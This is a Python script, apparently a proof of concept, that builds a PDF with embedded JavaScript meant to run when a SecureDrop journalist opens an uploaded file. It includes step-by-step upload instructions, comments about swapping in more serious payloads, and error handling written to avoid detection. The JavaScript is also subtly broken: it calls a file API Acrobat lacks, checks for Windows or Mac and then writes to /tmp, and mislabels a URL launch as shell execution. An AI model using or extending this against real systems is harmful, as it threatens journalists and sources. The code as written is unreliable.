#!/usr/bin/env python3
"""
make_malicious_pdf.py - Generates a malicious PDF file that demonstrates the SecureDrop vulnerability.
This script creates a PDF with embedded JavaScript that executes when opened in a vulnerable PDF reader.

For this proof of concept, the JavaScript only creates a harmless file to prove code execution,
but could be modified for more serious exploits.

Note: This uses a simplified technique for demonstration purposes. Real exploits would target
specific vulnerabilities in PDF readers like Evince which is common on Tails OS.
"""

import os
import sys
from PyPDF2 import PdfReader, PdfWriter
import io
from reportlab.pdfgen import canvas
from reportlab.lib.pagesizes import letter

def create_base_pdf():
    """Create a basic PDF to work with"""
    packet = io.BytesIO()
    c = canvas.Canvas(packet, pagesize=letter)
    c.setFont("Helvetica", 14)
    c.drawString(100, 700, "SecureDrop Vulnerability Proof of Concept")
    c.drawString(100, 680, "This file demonstrates code execution via malicious PDF upload")
    c.setFont("Helvetica", 10)
    c.drawString(100, 650, "When this file is opened on an air-gapped machine, it will attempt")
    c.drawString(100, 635, "to create a file in /tmp/ proving code execution occurred.")
    c.save()
    
    packet.seek(0)
    return PdfReader(packet)

def create_malicious_pdf(output_filename, javascript_payload):
    """Create a PDF with embedded malicious JavaScript"""
    
    # Create a new PDF with Reportlab
    base_pdf = create_base_pdf()
    output = PdfWriter()
    
    # Add the page from base PDF
    output.add_page(base_pdf.pages[0])
    
    # Add JavaScript action
    output.add_js(javascript_payload)
    
    # Write the output PDF
    with open(output_filename, "wb") as output_file:
        output.write(output_file)
    
    print(f"Created malicious PDF: {output_filename}")

def main():
    # JavaScript payload that creates a file in /tmp to prove code execution
    # In a real attack, this would be replaced with more sophisticated code
    # This demonstration uses a safe payload that creates a text file
    javascript_payload = """
    try {
        // Create a file in /tmp directory to prove code execution
        var app = this;
        
        // For Adobe Reader
        if (app.platform == "WIN" || app.platform == "MAC") {
            var file_path = "/tmp/securedrop_poc_execution_confirmed.txt";
            var file_content = "Code execution confirmed via SecureDrop vulnerability!\\n" +
                               "This file was created when opening a malicious PDF\\n" +
                               "uploaded through the SecureDrop source interface.\\n" +
                               "Date: " + new Date().toString();
                               
            try {
                // Try to use direct file access
                var file = new File(file_path);
                file.open("w");
                file.write(file_content);
                file.close();
                app.alert("Code execution successful - check /tmp directory");
            } catch (e) {
                // Fallback to shell execution where possible
                app.alert("Direct file access failed: " + e.message + "\\nAttempting shell execution...");
                try {
                    app.launchURL("file:///tmp/securedrop_poc_execution_confirmed.txt");
                } catch (e2) {
                    app.alert("All execution methods failed: " + e2.message);
                }
            }
        } else {
            // For other PDF readers
            app.alert("Non-standard PDF reader detected, modifying attack approach...");
            // Here would be adaptations for other PDF readers like Evince
        }
    } catch (e) {
        // Silently fail to avoid detection
        console.println("Error: " + e.message);
    }
    """
    
    output_filename = "malicious.pdf"
    create_malicious_pdf(output_filename, javascript_payload)
    
    # Optional: print instructions
    print("\nInstructions for testing:")
    print("1. Set up a local SecureDrop instance")
    print("2. Upload this PDF through the source interface")
    print("3. Download and decrypt as a journalist")
    print("4. Open the PDF and check for file creation in /tmp\n")

if __name__ == "__main__":
    main()